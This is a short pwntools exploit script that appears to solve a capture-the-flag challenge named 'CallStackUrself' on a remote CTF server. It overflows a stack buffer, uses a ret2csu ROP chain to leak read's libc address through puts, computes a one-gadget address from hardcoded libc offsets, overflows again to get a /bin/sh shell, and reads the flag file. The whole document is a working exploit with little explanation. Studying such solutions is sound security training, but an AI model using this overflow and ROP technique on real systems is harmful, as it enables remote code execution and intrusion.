from pwn import *

context.log_level = 'debug'
#s = process('./CallStackUrself')
s = remote('octf.hacklab.kr' ,30045)
e = ELF('./CallStackUrself')


pop6ret = 0x40073a
argset = 0x400720
trigger = 0x400729
vuln = 0x400668

s.recv()

payload  = 'A' * 0x30 # Buffer
payload += 'B' * 0x8 # sfp
payload += p64(pop6ret) # CSU chaining
payload += p64(0x0) # rbx
payload += p64(0x1) # rbp
payload += p64(e.got['puts'])# r12 
payload += p64(0x0) # r13 -> rdx
payload += p64(0x0) # r14 -> rsi
payload += p64(e.got['read'])# r15 -> edi
payload += p64(0x400720) # ret ( call [r12+rbx*8]
payload += p64(0x0) # add rsp, 8
payload += p64(0x0) # rbx
payload += p64(0x0) # rbp
payload += p64(0x0) # r12
payload += p64(0x0) # r13
payload += p64(0x0) # r14
payload += p64(0x0) # r15
payload += p64(vuln) # ret to vulnerability(read)

s.sendline(payload)

leak = u64(s.recv(6)+"\x00"*2)
libc = leak - 0xf7250
oneshot = libc + 0x4526a

payload  = "A"*0x30 # Buffer
payload += "B"*0x8 # sfp
payload += p64(oneshot) # ret -> execve(/bin/sh;)
payload += p64(0)*10 # setting NULL to stack for oneshot

s.sendline(payload) # enjoy your shell
s.recv()
s.sendline('cat /home/csuself/flag')
s.interactive() # by pwnWiz

